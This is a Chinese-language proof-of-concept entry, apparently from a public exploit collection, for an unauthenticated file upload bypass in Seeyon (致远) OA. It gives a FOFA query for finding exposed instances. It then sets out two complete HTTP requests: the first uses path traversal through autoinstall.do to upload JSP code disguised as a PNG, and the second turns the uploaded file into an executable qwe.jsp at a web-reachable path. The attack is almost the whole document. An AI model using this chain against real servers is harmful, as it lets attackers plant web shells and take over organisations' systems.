## 致远互联-OA前台fileUpload.do存在绕过文件上传漏洞

## fofa
```
title="协同管理软件 V5.6SP1"
```

## poc
```
POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
Host: your-ip
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)

--00content0boundary00
Content-Disposition: form-data; name="type"


--00content0boundary00
Content-Disposition: form-data; name="extensions"

png
--00content0boundary00
Content-Disposition: form-data; name="applicationCategory"


--00content0boundary00
Content-Disposition: form-data; name="destDirectory"


--00content0boundary00
Content-Disposition: form-data; name="destFilename"


--00content0boundary00
Content-Disposition: form-data; name="maxSize"


--00content0boundary00
Content-Disposition: form-data; name="isEncrypt"

false
--00content0boundary00
Content-Disposition: form-data; name="file1"; filename="1.png"
Content-Type: Content-Type: application/pdf

<% out.println("hello");%>
--00content0boundary00--
```

![image](https://github.com/wy876/POC/assets/139549762/63b91745-854d-4bd4-8a1b-2a14f124b030)

携带fileid值将文件转换为jsp文件 
```
POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)

method=uploadMenuIcon&fileid=获取到的值&filename=qwe.jsp
```

文件路径 `http://ip/seeyon/main/menuIcon/qwe.jsp`
